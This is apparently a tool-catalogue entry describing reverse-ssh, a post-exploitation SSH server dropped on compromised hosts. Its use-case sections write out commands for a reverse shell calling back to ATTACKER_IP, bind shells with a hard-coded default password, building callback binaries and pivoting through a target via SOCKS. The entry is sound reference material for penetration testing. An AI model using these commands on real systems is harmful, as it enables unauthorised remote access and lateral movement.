---
name: "reverse-ssh"
categories:
  - tunnel
homepage: "https://github.com/Fahrj/reverse-ssh"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: go
license: GPL3
meta-checked: "2026-11-13"
github-repo: "Fahrj/reverse-ssh"
github-match: "exact"
github-stars: 1078
gh-checked: "2026-11-13"
worth: 5.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
---

# reverse-ssh

> Statically-linked SSH server (under 1.5 MB) built for post-exploitation — a fully interactive reverse or bind shell with file transfer and port forwarding, for Linux and Windows.

## What it's for

ReverseSSH turns an initial foothold into a proper session: instead of a fragile netcat shell you drop a tiny static Go binary on the target that runs a full SSH server and, optionally, dials home. You get a fully interactive shell with TAB-completion and history, file transfer via sftp, and local/remote/dynamic port forwarding — it works as both a bind and a reverse shell, on Unix and Windows (fully interactive Windows shells rely on ConPTY, so Windows 10 build 17763+; on older builds pipe through `ssh-shellhost.exe` from Win32-OpenSSH with `-s`, or run non-interactively). Any username is accepted with the default password `letmeinbrudipls` or the built-in public key — both overridable at compile time, which is the recommended way to ship a personalized binary. It is only the access layer: pairing it with privesc tooling is up to you.

## Typical use cases

### Run it as a bind shell

The target can accept inbound connections.

```
./reverse-ssh -v -l -p 4444
```

Outcome: the SSH server listens on port 4444 on the target — from your machine `ssh -p 4444 target` (any username, default password `letmeinbrudipls`) drops you into a fully interactive shell; `ssh -p 4444 target whoami` runs a single command, and `sftp -P 4444 target` gives full file transfer.

### Dial home as a reverse shell

The target can only make outbound connections.

```
./reverse-ssh -p 443 ATTACKER_IP
```

Outcome: the binary connects out to your listener on 443 and then binds its SSH server to port 8888 on your side (change with `-b`, `-b 0` takes any free port) — catch it with your own sshd (`./reverse-ssh -p 22 user@ATTACKER_IP` authenticates as a real user) or with `./reverse-ssh -v -l -p 443` as the listener; once connected, `ssh -p 8888 127.0.0.1` is the session. Mind the port collision note: a listener LPORT of 8888 collides with the default callback bind.

### Pivot through the target

Turn one shell into network access.

```
ssh -p 8888 -D 9050 127.0.0.1
```

Outcome: dynamic port forwarding through the reverse-ssh session — a SOCKS proxy on 127.0.0.1:9050 that egresses from the target; point proxychains or a browser at it, and use ordinary `-L`/`-R` forwards for static tunnels. Restrict the attack surface from the target side with `-N` when it only needs to forward.

### Build a personalized binary

Ship your own credentials and callback defaults.

```
RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" LHOST="ATTACKER_IP" LPORT="443" BPORT="0" make compressed
```

Outcome: compiles static, upx-compressed binaries that default to the reverse scenario dialing ATTACKER_IP:443 with your password and key — the target-side command becomes just `./reverse-ssh`, no flags and no default credential; other build-time variables include `RS_SHELL` (default shell), `LUSER`, and `NOCLI` (strips all flag parsing). Cross-compile with `GOARCH`/`GOOS` (`go tool dist list` enumerates targets).

### Get a real shell on old Windows

Pre-ConPTY Windows hosts.

```
./reverse-ssh.exe -v -l -s ssh-shellhost.exe
```

Outcome: all session traffic is piped through `ssh-shellhost.exe` (dropped in the same directory, from the Win32-OpenSSH releases), which emulates a pty and translates virtual terminal codes — arrow keys and interrupts work on builds older than Windows 10 17763; the fallback without it is appending `cmd` to the ssh command for a plain non-interactive session.

No corpus evidence — derived from upstream documentation.
